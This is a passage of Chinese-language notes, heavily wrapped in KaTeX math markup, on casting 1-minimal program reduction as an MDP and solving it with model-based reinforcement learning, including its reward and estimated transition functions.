class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.63em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></eqn></section> 即状态转移仅放生在 下一个候选程序通过属性测试 或 需要更小的粒度时</li><li>Reward function:奖励函数定义如下 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>R</mi><mo stretchy="false">(</mo><mo stretchy="false">⟨</mo><mi>L</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">⟩</mo><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1</mn><mspace width="1em"><mo stretchy="false">(</mo><mi>L</mi><mtext> </mtext><mtext> </mtext><mi>i</mi><mi>s</mi><mtext> </mtext><mtext> </mtext><mn>1</mn><mo>−</mo><mi>m</mi><mi>i</mi><mi>n</mi><mi>i</mi><mi>m</mi><mi>a</mi><mi>l</mi><mo stretchy="false">)</mo></mspace></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mspace width="1em"><mo stretchy="false">(</mo><mi>o</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>w</mi><mi>i</mi><mi>s</mi><mi>e</mi><mo stretchy="false">)</mo></mspace></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">R( \langle L,n \rangle ) = \begin{cases} 1\quad (L\,\,is\,\,1-minimal) \\ 0\quad (otherwise)\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(⟨</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">⟩)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mopen">(</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">minima</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mopen">(</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.02778em;">er</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">i</span><span class="mord mathnormal">se</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></eqn></section> 即当<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span></eq>是1-minimal时,奖励为1,否则为0</li></ul></li><li><p>解决MDP是不切实际的,为此使用MBRL</p></li><li><p>我们学习了一个概率模型 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">M</mi><mo>:</mo><mi mathvariant="double-struck">P</mi><mo>→</mo><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\mathcal{M}: \mathbb{P} \rightarrow [0,1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathcal">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6889em;"></span><span class="mord mathbb">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span></eq> ,返回候选程序通过属性测试函数的概率 并 从中获得策略</p></li><li><p>我们用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>T</mi><mo>^</mo></mover><mo separator="true">,</mo><mover accent="true"><mi>R</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{T},\hat{R}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1412em;vertical-align:-0.1944em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span></span></span></span></eq>表示<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo separator="true">,</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">T,R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></eq>的估计,他们的定义和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">M</mi></mrow><annotation encoding="application/x-tex">\mathcal{M}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathcal">M</span></span></span></span></eq>而不是<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></eq>,</p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>T</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{T}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9468em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span></span></span></span></eq>定义如下 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><mi>T</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="script">M</mi><mo stretchy="false">(</mo><msub><mi>u</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><msub><mi>K</mi><mrow><mi>s</mi><mo separator="true">,</mo><mi>a</mi></mrow></msub><mspace width="1em"><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">⟨</mo><msub><mi>u</mi><mi>i</mi></msub><mo separator="true">,</mo><mn>2</mn><mo stretchy="false">⟩</mo><mo stretchy="false">)</mo></mspace></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="script">M</mi><mo stretchy="false">(</mo><mi>L</mi><mi mathvariant="normal">/</mi><msub><mi>u</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><msub><mi>K</mi><mrow><mi>s</mi><mo separator="true">,</mo><mi>a</mi></mrow></msub><mspace width="1em"><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">⟨</mo><mi>L</mi><mi mathvariant="normal">/</mi><msub><mi>u</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">⟩</mo><mo stretchy="false">)</mo></mspace></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><msub><mo>∏</mo><mrow><mo stretchy="false">⟨</mo><msup><mi>L</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>n</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">⟩</mo><mo>∈</mo><mi>A</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow></msub><mn>1</mn><mo>−</mo><mi mathvariant="script">M</mi><mo stretchy="false">(</mo><msup><mi>L</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><msub><mi>K</mi><mrow><mi>s</mi><mo separator="true">,</mo><mi>a</mi></mrow></msub><mspace width="1em"><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">⟨</mo><mi>L</mi><mo separator="true">,</mo><mn>2</mn><mi>n</mi><mo stretchy="false">⟩</mo><mo separator="true">,</mo><mn>2</mn><mi>n</mi><mo>≤</mo><mi mathvariant="normal">∣</mi><mi>L</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mspace></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mspace width="1em"><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">⟨</mo><mi>L</mi><mo separator="true">,</mo><mn>2</mn><mi>n</mi><mo stretchy="false">⟩</mo><mo separator="true">,</mo><mn>2</mn><mi>n</mi><mo>≥</mo><mi mathvariant="normal">∣</mi><mi>L</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mspace></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\hat{T}(s&#x27;|s,a) = \begin{cases} \mathcal{M}(u_i)/K_{s,a} \quad (s&#x27; = \langle u_i,2 \rangle) \\ \mathcal{M}(L /u_i)/K_{s,a} \quad (s&#x27; = \langle L/u_i,n-1 \rangle) \\ (\prod_{\langle L&#x27;,n&#x27;\rangle \in A(s)/s&#x27;}1-\mathcal{M}(L&#x27;))/K_{s,a} \quad (s&#x27; = \langle L,2n \rangle,2n\leq|L|) \\ 0 \quad (s&#x27; = \langle L,2n \rangle,2n\geq|L|)\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1968em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:5.8027em;vertical-align:-2.6514em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.95em;"><span style="top:-1.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-1.592em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.916em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.916em" style="width:0.8889em" viewbox="0 0 888.89 916" preserveaspectratio="xMinYMin"><path d="M384 0 H504 V916 H384z M384 0 H504 V916 H384z"/></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.916em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.916em" style="width:0.8889em" viewbox="0 0 888.89 916" preserveaspectratio="xMinYMin"><path d="M384 0 H504 V916 H384z M384 0 H504 V916 H384z"/></svg></span></span><span style="top:-5.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.45em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.1514em;"><span style="top:-5.1514em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathcal">M</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">⟨</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mclose">⟩)</span></span></span><span style="top:-3.7114em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathcal">M</span><span class="mopen">(</span><span class="mord mathnormal">L</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">⟨</span><span class="mord mathnormal">L</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">⟩)</span></span></span><span style="top:-2.2714em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mopen">(</span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2253em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">⟨</span><span class="mord mtight"><span class="mord mathnormal mtight">L</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose mtight">⟩</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight">A</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">s</span><span class="mclose mtight">)</span><span class="mord mtight">/</span><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4747em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathcal">M</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">))</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">⟨</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mord mathnormal">n</span><span class="mclose">⟩</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">∣</span><span class="mord mathnormal">L</span><span class="mord">∣</span><span class="mclose">)</span></span></span><span style="top:-0.7886em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">⟨</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mord mathnormal">n</span><span class="mclose">⟩</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">∣</span><span class="mord mathnormal">L</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.6514em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></eqn></section> 其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mrow><mi>s</mi><mo separator="true">,</mo><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">K_{s,a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>是一个归一化因子,使得<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>T</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{T}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9468em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span></span></span></span></eq>成为一个概率分布<ul><li>前两个例子中,转移概率被定义为子集和他的补集通过质量测试函数的概率</li><li>另外两个例子针对更小的粒度,其概率为,1减去所有子集通过属性测试的概率. 最后如果粒度已经达到最小,则转移概率为0</li></ul></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>R</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{R}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9468em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span></span></span></span></eq>定义如下 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><mi>R</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mo stretchy="false">⟨</mo><mi>L</mi><mo separator="true">,</mo><mi>n</mi><mo 